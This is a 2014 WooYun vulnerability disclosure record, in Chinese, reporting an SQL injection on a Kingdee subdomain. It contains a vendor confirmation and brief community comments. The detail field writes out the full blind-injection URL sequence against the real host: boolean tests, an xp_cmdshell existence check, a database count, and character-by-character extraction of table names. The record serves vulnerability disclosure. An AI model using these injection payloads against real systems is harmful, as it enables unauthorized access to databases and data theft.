{"id": 4690, "wybug_id": "wooyun-2014-053010", "wybug_title": "金蝶重要分站SQL注入漏洞", "wybug_corp": "金蝶", "wybug_author": "clzzy", "wybug_date": "2014-03-07 10:39", "wybug_open_date": "2014-04-21 10:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-21：\t细节向公众公开  简要描述： 金蝶分站SQL注入 详细说明：  金蝶某分站存在SQL注入注入点：http://open.kingdee.com/K3Cloud/CDPPortal/App.aspx?id=107986http://open.kingdee.com/K3Cloud/CDPPortal/App.aspx?id=107986/**/and/**/1=1http://open.kingdee.com/K3Cloud/CDPPortal/App.aspx?id=107986/**/and/**/1=2http://open.kingdee.com/K3Cloud/CDPPortal/App.aspx?id=107986/**/and/**/1=(Select/**/count(*)/**/FROM/**/master.dbo.sysobjects/**/Where/**/xtype='X'/**/AND/**/name='xp_cmdshell') 正常返回，xp_cmdshell存在http://open.kingdee.com/K3Cloud/CDPPortal/App.aspx?id=107986/**/and/**/(select/**/count(*)/**/from/**/master.dbo.sysdatabases)=7 （7个数据库）http://open.kingdee.com/K3Cloud/CDPPortal/App.aspx?id=107986/**/and len((select/**/top/**/1/**/name/**/from/**/sysobjects/**/where/**/xtype='u'))=21 （第一个数据库名字的长度为21）http://open.kingdee.com/K3Cloud/CDPPortal/App.aspx?id=107986/**/and ASCII(substring((select/**/top/**/1/**/name/**/from/**/sysobjects/**/where/**/xtype='u'),1,1))=84 （第一个数据库名字的第一个字符为T，依次猜解出数据库的名字）http://open.kingdee.com/K3Cloud/CDPPortal/App.aspx?id=107986/**/and/**/ substring((select/**/top/**/1/**/name/**/from/**/sysobjects/**/where/**/xtype='u'),1,21)='T_ORG_ORGANIZATIONS_L' （第一个数据库名字：T_ORG_ORGANIZATIONS_L）猜出的库名：T_ORG_ORGANIZATIONS_L、T_KDS_RPT_L、Z_CDP_HISTORYAUTHORIZE_R、T_ORG_PRECHANGERULEENRY、T_ORG_PRECHANGERULEENTRY、T_BD_PRODUCTMODEL、T_META_FORMBILLLIST   漏洞证明：  注入存在性：\n\n写脚本跑了一下库名：\n\n   修复方案：  过滤   版权声明：转载请注明来源 clzzy@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2014-03-07 19:52 厂商回复： 感谢 clzzy 兄台对金蝶的关注，这洞确实大了。老代码正在修复中，谢谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-07 11:46 |    \t\t委员长 \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:8        | 攘外必先安内！)\t\t \n  金蝶1rank无疑.......    \n     2014-03-07 13:09 |    \t\tclzzy \t\t\t( 普通白帽子  |\t\t\t        Rank:176 漏洞数:18        )\t\t \n  @委员长 如果1Rank，下次直接放到各大论坛。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}